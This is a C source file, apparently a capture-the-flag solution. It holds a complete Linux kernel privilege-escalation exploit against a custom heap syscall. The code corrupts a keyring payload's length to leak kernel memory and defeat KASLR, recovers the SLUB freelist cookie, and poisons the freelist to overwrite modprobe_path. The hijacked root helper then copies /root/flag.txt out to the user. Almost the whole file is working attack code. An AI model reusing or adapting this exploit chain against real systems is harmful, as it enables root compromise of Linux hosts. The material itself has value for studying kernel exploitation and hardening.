#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
 
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <linux/keyctl.h>
#include <ctype.h>
#include <pthread.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <asm/ldt.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <linux/if_packet.h>


void err_exit(char *msg)
{
    perror(msg);
    sleep(1);
    exit(EXIT_FAILURE);
}

void fail_exit(char *msg)
{
    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
    sleep(1);
    exit(EXIT_FAILURE);
}

void info(char *msg)
{
    printf("\033[32m\033[1m[+] %s\n\033[0m", msg);
}

void hexx(char *msg, size_t value)
{
    printf("\033[32m\033[1m[+] %s: %#lx\n\033[0m", msg, value);
}

void binary_dump(char *desc, void *addr, int len) {
    uint64_t *buf64 = (uint64_t *) addr;
    uint8_t *buf8 = (uint8_t *) addr;
    if (desc != NULL) {
        printf("\033[33m[*] %s:\n\033[0m", desc);
    }
    for (int i = 0; i < len / 8; i += 4) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 4; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 32 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}

/* bind the process to specific core */
void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

#ifndef __NR_IPS
#define __NR_IPS 548
#endif

typedef struct {
  int idx;
  unsigned short priority;
  char *data;
} userdata;

typedef struct {
  uint64_t next;
  int idx;
  unsigned short priority;
  char data[114];
} chunk;

void add(char* data) {
	userdata n = { .data = data };
	if (syscall(__NR_IPS, 1, &n) < 0)
		err_exit("add");
}

void dele(int idx) {
	userdata n = { .idx = idx };
	syscall(__NR_IPS, 2, &n);
}

void edit(int idx, char* data) {
	userdata n = { .idx = idx, .data = data };
	if (syscall(__NR_IPS, 3, &n)) err_exit("deit");
}

void copy(int idx) {
	userdata n = { .idx = idx };
	syscall(__NR_IPS, 4, &n);
}

int key_alloc(char *description, char *payload, size_t plen)
{
    return syscall(__NR_add_key, "user", description, payload, plen, 
                   KEY_SPEC_PROCESS_KEYRING);
}

int key_update(int keyid, char *payload, size_t plen)
{
    return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
}

int key_read(int keyid, char *buffer, size_t buflen)
{
    return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
}

int key_revoke(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
}

int key_unlink(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
}

typedef unsigned long long __u64;

#define swap64(x) ((__u64)(                             \
        (((__u64)(x) & (__u64)0x00000000000000ffULL) << 56) |   \
        (((__u64)(x) & (__u64)0x000000000000ff00ULL) << 40) |   \
        (((__u64)(x) & (__u64)0x0000000000ff0000ULL) << 24) |   \
        (((__u64)(x) & (__u64)0x00000000ff000000ULL) <<  8) |   \
        (((__u64)(x) & (__u64)0x000000ff00000000ULL) >>  8) |   \
        (((__u64)(x) & (__u64)0x0000ff0000000000ULL) >> 24) |   \
        (((__u64)(x) & (__u64)0x00ff000000000000ULL) >> 40) |   \
        (((__u64)(x) & (__u64)0xff00000000000000ULL) >> 56)))

void get_flag() {
	system("echo -ne '#!/bin/sh\n/bin/cp /root/flag.txt /home/user/flag.txt\n/bin/chmod 777 /home/user/flag.txt' > /home/user/x");
        system("chmod +x /home/user/x");
        system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/dummy");
        system("chmod +x /home/user/dummy");
        system("/home/user/dummy");
        sleep(0.3);
        system("cat /home/user/flag.txt");
}

int main(int argc, char** argv, char** envp)
{
	bind_core(0);
	int res;
	char desc[0x20] = { 0 };
	char buf[0x10000] = { 0 };
	uint64_t kbase = 0xffffffff81000000;
	uint64_t koffset = -1;
	uint64_t user_free_payload_rcu = 0xffffffff8137c190;
	
	for (int i = 0; i < 16; i++) {
		memset(buf, 'A'+i, 0x20);
		add(buf);
	}

	copy(8);
	dele(8);

	sprintf(desc, "%s", "XiaozaYa");
	int key_id = key_alloc(desc, buf, 80);
	if (key_id < 0) err_exit("key_alloc");

	memset(buf, '\xf0', 8);

	edit(-1, buf);

	res = key_read(key_id, buf, 0xff00);
	if (res < 0x1000) fail_exit("failed to overwrite datalen");

	for (int i = 0; i < 15; i++) {
		if (i != 8) dele(i);
	}

	#define SPRAY_KEY_NUMS 16
	int keys[SPRAY_KEY_NUMS];
	for (int i = 0; i < SPRAY_KEY_NUMS; i++) {
		sprintf(desc, "%s%d", "XiaozaYa", i);
		keys[i] = key_alloc(desc, buf, 80);
		if (keys[i] < 0) err_exit("key_alloc");
	}

	for (int i = 0; i < SPRAY_KEY_NUMS; i++) {
		key_revoke(keys[i]);
	}

	res = key_read(key_id, buf, 0xff00);
	for (int i = 0; i < res / 8; i++) {
		uint64_t val = *(uint64_t*)(buf + i*8);
		if ((val&0xfff) == 0x190 && val > 0xffffffff81000000 && ((val>>32)&0xffffffff) == 0xffffffff) {
			koffset = val - user_free_payload_rcu;
			kbase += koffset;
			break;
		}
	}

	if (koffset == -1) fail_exit("failed to bypass kaslr");

	uint64_t modprobe_path = 0xffffffff8244fa20 + koffset;
	printf("[+] koffset: %#llx\n", koffset);
	printf("[+] kbase: %#llx\n", kbase);
	printf("[+] modprobea_path: %#llx\n", modprobe_path);

	memset(buf, 0, sizeof(buf));
	for (int i = 0; i < 15; i++) {
		userdata n = { .data = buf, .priority = 'A'+i };
		syscall(__NR_IPS, 1, &n);
	}

	res = key_read(key_id, buf, 0xff00);
//	binary_dump("LEAK DATA", buf+128-0x18, 128 * 20);
	chunk* h = NULL;
	int nums = 0;
	uint64_t addrs[16] = { 0 };
	uint64_t offsets[16];
	for (int i = 0; i < 16; i++) offsets[i] = -1;
	for (uint64_t i = 0; i < (res - 128 + 0x18) / 128; i++) {
		h = (buf+128-0x18) + i * 128;
		if (h->next > 0xffff000000000000 && (h->next&0xffff000000000000) == 0xffff000000000000 && (h->idx + 'A') == h->priority) {
			if (h->idx == 15) {
				addrs[0] = h->next;
			} else {
				addrs[h->idx+1] = h->next;
			}
			offsets[h->idx] = i;
		}
	}

	#define IDX 0
	#define ADDR 1
	#define OFFSET 2
	uint64_t map[16][3];
	for (int i = 0; i < 16; i++) {
		if (addrs[i] && offsets[i] != -1) {
			printf("[---offset %03x---] %02d => %#llx\n", offsets[i], i, addrs[i]);
			map[nums][IDX] = i;
			map[nums][ADDR] = addrs[i];
			map[nums][OFFSET] = offsets[i];
			nums++;
		}
	}

	printf("[+] hit counts: %d\n", nums);
	if (nums < 2) fail_exit("failed to hit");

	uint64_t evil_chunk = map[0][ADDR] - map[0][OFFSET] * 128 - 128;
	printf("[+] evil_chunk: %#llx\n", evil_chunk);

	dele(map[0][IDX]);
	dele(map[1][IDX]);

	res = key_read(key_id, buf, 0xff00);
	uint64_t xor_val0 = *(uint64_t*)(buf+128-0x18+128*map[0][OFFSET]+0x40);
	uint64_t xor_val1 = *(uint64_t*)(buf+128-0x18+128*map[1][OFFSET]+0x40);
	printf("[+] xor_val0: %#llx\n", xor_val0);
	printf("[+] xor_val1: %#llx\n", xor_val1);

	uint64_t cookie = map[0][ADDR] ^ swap64((map[1][ADDR]+0x40)) ^ xor_val1;
	printf("[+] cookie: %#llx\n", cookie);


	memset(buf, '\x00', 0x100);
	memset(buf, 'A', 0x32);
	buf[0] = '\xff';
	buf[1] = '\xff';
	*(uint64_t*)(buf+0x32) = (modprobe_path-8-6) ^ cookie ^ swap64((evil_chunk+0x40));
	printf("[+] evil freelist: %#llx\n", *(uint64_t*)(buf+0x32));
	printf("[+] data len: %x\n", strlen(buf));	
	key_revoke(key_id);
//	key_unlink(key_id);
//	edit(-1, buf);
//	edit(-1, buf);
	// 不要删除 getchar(), 否则导致 edit 写入失败
	getchar();
	edit(-1, buf);

	memset(buf, '\x00', 0x100);
	strcpy(buf, "/home/user/x");
	for (int i = 0; i < 2; i++) {
		add(buf);
	}

	get_flag();
//	puts("[+] debug");
//	getchar();
	
	puts("[+] EXP NERVER END");
        return 0;
}
